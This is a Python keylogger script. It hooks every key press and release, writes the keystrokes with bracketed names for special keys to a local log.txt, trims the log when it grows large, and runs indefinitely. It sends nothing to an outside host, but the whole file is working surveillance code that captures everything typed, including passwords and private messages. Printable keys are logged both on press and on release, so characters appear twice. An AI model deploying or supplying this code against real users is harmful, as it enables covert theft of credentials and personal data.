import keyboard
import os
import datetime

# dictionary mapping special keys to their human-readable names
SPECIAL_KEYS_MAP = {
    "space": " [SPACE] ",
    "enter": " [ENTER] ",
    "esc": " [ESC] ",
    "ctrl": " [CTRL] ",
    "alt": " [ALT] ",
    "tab": " [TAB] ",
    "maj": " [MAJ] ",
    "backspace": " [BACKSPACE] ",
    "caps lock": " [CAPS LOCK] ",
    "up": " [UP] ",
    "down": " [DOWN] ",
    "left": " [LEFT] ",
    "right": " [RIGHT] ",
    "page up": " [PAGE UP] ",
    "page down": " [PAGE DOWN] ",
    "home": " [HOME] ",
    "end": " [END] ",
    "insert": " [INSERT] ",
    "delete": " [DELETE] ",
    "f1": " [F1] ",
    "f2": " [F2] ",
    "f3": " [F3] ",
    "f4": " [F4] ",
    "f5": " [F5] ",
    "f6": " [F6] ",
    "f7": " [F7] ",
    "f8": " [F8] ",
    "f9": " [F9] ",
    "f10": " [F10] ",
    "f11": " [F11] ",
    "f12": " [F12] ",
}

# file size limit in bytes
MAX_FILE_SIZE = 6000

# number of lines to keep in file
NUM_LINES_TO_KEEP = 1000

# function to add content to a file without needing to open and close it each time
def append_to_file(filename, content):
    with open(filename, "a") as f:
        f.write(content)

# function to write keyboard inputs to file
def write_keys(keys_pressed):
    formatted_keys = format_keys(keys_pressed)
    append_to_file("log.txt", formatted_keys)

# function to format keys with brackets around special keys
def format_keys(keys_pressed):
    formatted_keys = ""
    for key in keys_pressed:
        if key in SPECIAL_KEYS_MAP:
            formatted_keys += SPECIAL_KEYS_MAP[key]
        else:
            formatted_keys += key
    return formatted_keys

# function to clean file if size exceeds MAX_FILE_SIZE
def clean_file():
    with open("log.txt", "r+") as f:
        lines = f.readlines()
        if len(lines) > NUM_LINES_TO_KEEP:
            f.seek(0)
            f.writelines(lines[-NUM_LINES_TO_KEEP:])
            f.truncate()

# function called on each key press
def on_press(event):
    try:
        keys_pressed = []
        if event.name in SPECIAL_KEYS_MAP:
            keys_pressed.append(event.name)
        elif event.name.isprintable():
            keys_pressed.append(event.name)
        formatted_keys = format_keys(keys_pressed)
        append_to_file("log.txt", formatted_keys)
        if os.path.getsize("log.txt") > MAX_FILE_SIZE:
            clean_file()
    except Exception as e:
        print(f"Error: {e}")

# function called on each key release
def on_release(event):
    try:
        keys_pressed = []
        if event.name in ["ctrl", "alt", "maj"]:
            for key in ["ctrl", "alt", "maj"]:
                if keyboard.is_pressed(key):
                    keys_pressed.append(key)
            if len(keys_pressed) > 0:
                formatted_keys = format_keys(keys_pressed)
                append_to_file("log.txt", formatted_keys)
        elif event.name.isprintable():
            write_keys([event.name])
            if os.path.getsize("log.txt") > MAX_FILE_SIZE:
                clean_file()
    except Exception as e:
        print(f"Error: {e}")

# set up keyboard hook
keyboard.on_press(on_press)
keyboard.on_release(on_release)

# create log file if it doesn't exist
if not os.path.exists("log.txt"):
    open("log.txt", "w").close()

# log start time
append_to_file("log.txt", f"\n\n\n\n\n{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} LOG START\n\n\n\n\n")

# keep script running
while True:
    try:
        keyboard.wait()
    except KeyboardInterrupt:
        break
